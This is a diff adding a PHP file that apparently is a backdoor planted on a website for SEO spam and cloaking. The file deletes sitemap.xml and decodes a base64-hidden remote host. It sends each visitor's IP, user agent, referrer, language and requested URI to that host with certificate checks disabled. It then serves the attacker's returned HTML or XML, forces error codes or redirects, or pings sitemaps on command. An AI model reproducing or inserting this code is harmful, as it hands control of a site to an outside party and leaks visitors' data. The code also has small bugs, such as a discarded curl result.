@@ -1,0 +1,114 @@
+<?php
+@set_time_limit(0);
+@error_reporting(0);
+@ignore_user_abort(1);
+if (isset($_SERVER['DOCUMENT_ROOT'])) {
+	$path = $_SERVER['DOCUMENT_ROOT'];
+}else{
+	$path = dirname(__FILE__);
+}
+if(file_exists($file = $path."/sitemap.xml")) {
+    @unlink($file);
+}
+$my_web = "cDV1M3hhLnNlcHJvb2YudG9w";
+$http_type = "http";
+if (check_https()) {$http_type = 'https';} else {$http_type = 'http';}
+$my_uri = urlencode(get_uri());
+$to_web = urldecode(base64_decode($my_web));
+$my_lang = urlencode(@$_SERVER["HTTP_ACCEPT_LANGUAGE"]); 
+$my_host = urlencode($_SERVER['HTTP_HOST']);
+$my_lang = urlencode($my_lang);
+$my_origin = '';
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $my_origin = $_SERVER['HTTP_REFERER'];
+}
+$my_origin = urlencode($my_origin);
+$my_agent = urlencode(strtolower($_SERVER['HTTP_USER_AGENT']));
+$my_id = urlencode(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR']:'');
+$zy_source = 'http'.'://'.$to_web.'/indexone.php?my_host='.$my_host.'&my_uri='.$my_uri.'&my_lang='.$my_lang.'&my_origin='.$my_origin.'&http_type='.$http_type.'&my_agent='.$my_agent.'&my_id='.$my_id;
+$zy_content = trim(cdoget($zy_source));
+
+if (!strstr($zy_content, 'notdoanything')) {
+    if (strstr($zy_content, 'echohtmlcontent')) {
+        @header("Content-type: text/html; charset=utf-8");
+        $zy_content = str_replace("echohtmlcontent", '', $zy_content);
+        echo $zy_content;
+        exit();
+    }else if(strstr($zy_content, 'echoxmlcontent')){
+        $zy_content = str_replace("echoxmlcontent", '', $zy_content);
+        @header("Content-type: text/xml");
+        echo trim($zy_content);
+        exit();
+    }else if(strstr($zy_content, 'echopingxmlcontent')){
+        $zy_content = str_replace("echopingxmlcontent", '', $zy_content);
+        @header("Content-type: text/html; charset=utf-8");
+        echo ping_sitemap($zy_content);
+        exit();
+    }else if (strstr($zy_content, 'echo500pagecontent')) {
+        @header('HTTP/1.1 500 Internal Server Error');
+        exit();
+    }else if (strstr($zy_content, 'echo404pagecontent')) {
+        @header('HTTP/1.1 404 Not Found');
+        exit();
+    }else if (strstr($zy_content, 'echo301pagecontent')) {
+        @header('HTTP/1.1 301 Moved Permanently');
+        $zy_content = str_replace("echo301pagecontent", '', $zy_content);
+        header('Location: ' . $zy_content);
+        exit();
+    }
+}
+
+function check_https(){
+    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
+        return true;
+    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
+        return true;
+    }
+    return false;
+}
+
+function get_uri()
+{
+    if (isset($_SERVER['REQUEST_URI'])) {
+        $my_uri = $_SERVER['REQUEST_URI'];
+    } else {
+        if (isset($_SERVER['argv'])) {
+            $my_uri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
+        } else {
+            $my_uri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
+        }
+    }
+    return $my_uri;
+}
+
+function cdoget($zy_source){
+	$contents = '';
+    if(function_exists('curl_init')){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $zy_source);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+        $file_contents = curl_exec($ch);
+        curl_close($ch);
+    }
+    if (empty(trim($contents))) {
+        $contents = @file_get_contents($zy_source);
+    }
+    return $contents;
+}
+
+function ping_sitemap($zy_content){
+    $url_list = explode("#####", trim($zy_content));
+    $result_str = '';
+    foreach($url_list as $url){
+        $ping_result = cdoget($url);
+        $ping_msg = (strpos($ping_result, 'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
+        $return_str .= $url . ' ===> ' . $ping_msg . '<br>';
+    }
+    return $return_str;
+}
+?>
